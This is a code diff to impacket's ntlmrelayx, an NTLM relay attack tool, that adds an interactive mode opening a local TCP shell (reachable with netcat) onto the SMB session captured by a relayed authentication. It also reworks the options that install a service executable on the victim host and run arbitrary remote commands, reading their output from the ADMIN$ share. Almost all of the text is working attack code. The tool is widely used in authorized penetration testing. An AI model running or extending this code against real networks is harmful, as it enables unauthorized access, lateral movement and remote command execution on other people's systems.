@@ -51,11 +51,12 @@ from impacket.examples import serviceinstall
 from impacket.examples.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
 from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
+from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
 from impacket.smbconnection import SMBConnection
-
+from smbclient import MiniImpacketShell
 
 class SMBAttack(Thread):
-    def __init__(self, config, SMBClient, exeFile, command):
+    def __init__(self, config, SMBClient, username):
         Thread.__init__(self)
         self.daemon = True
         if isinstance(SMBClient, smb.SMB) or isinstance(SMBClient, smb3.SMB3):
@@ -63,18 +64,28 @@ class SMBAttack(Thread):
         else:
             self.__SMBConnection = SMBClient
         self.config = config
-        self.__exeFile = exeFile
-        self.__command = command
         self.__answerTMP = ''
-        if exeFile is not None:
-            self.installService = serviceinstall.ServiceInstall(SMBClient, exeFile)
+        if self.config.interactive:
+            #Launch locally listening interactive shell
+            self.tcpshell = TcpShell()
+        else:
+            self.tcpshell = None
+            if self.config.exeFile is not None:
+                self.installService = serviceinstall.ServiceInstall(SMBClient, self.config.exeFile)
 
     def __answer(self, data):
         self.__answerTMP += data
 
     def run(self):
         # Here PUT YOUR CODE!
-        if self.__exeFile is not None:
+        if self.tcpshell is not None:
+            logging.info('Started interactive SMB client shell via TCP on 127.0.0.1:%d' % self.tcpshell.port)
+            #Start listening and launch interactive shell
+            self.tcpshell.listen()
+            self.shell = MiniImpacketShell(self.__SMBConnection,self.tcpshell.socketfile)
+            self.shell.cmdloop()
+            return
+        if self.config.exeFile is not None:
             result = self.installService.install()
             if result is True:
                 logging.info("Service Installed.. CONNECT!")
@@ -97,8 +108,8 @@ class SMBAttack(Thread):
                 return
 
             try:
-                if self.__command is not None:
-                    remoteOps._RemoteOperations__executeRemote(self.__command)
+                if self.config.command is not None:
+                    remoteOps._RemoteOperations__executeRemote(self.config.command)
                     logging.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
                     self.__answerTMP = ''
                     self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
@@ -271,6 +282,9 @@ if __name__ == '__main__':
                                                                              'full URL, one per line')
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
+    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient/mssqlclient console instead'
+                        'of executing a command after a successful relay. This console will listen locally on a '
+                        ' tcp port and can be reached with for example netcat.')    
     parser.add_argument('-ra','--random', action='store_true', help='Randomize target selection (HTTP server only)')
     parser.add_argument('-r', action='store', metavar = 'SMBSERVER', help='Redirect HTTP requests to a file:// path on SMBSERVER')
     parser.add_argument('-l','--lootdir', action='store', type=str, required=False, metavar = 'LOOTDIR', help='Loot '
@@ -354,6 +368,7 @@ if __name__ == '__main__':
         c.setOutputFile(options.output_file)
         c.setLDAPOptions(options.no_dump,options.no_da)
         c.setMSSQLOptions(options.query)
+        c.setInteractive(options.interactive)
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
         if server is HTTPRelayServer and options.r is not None:
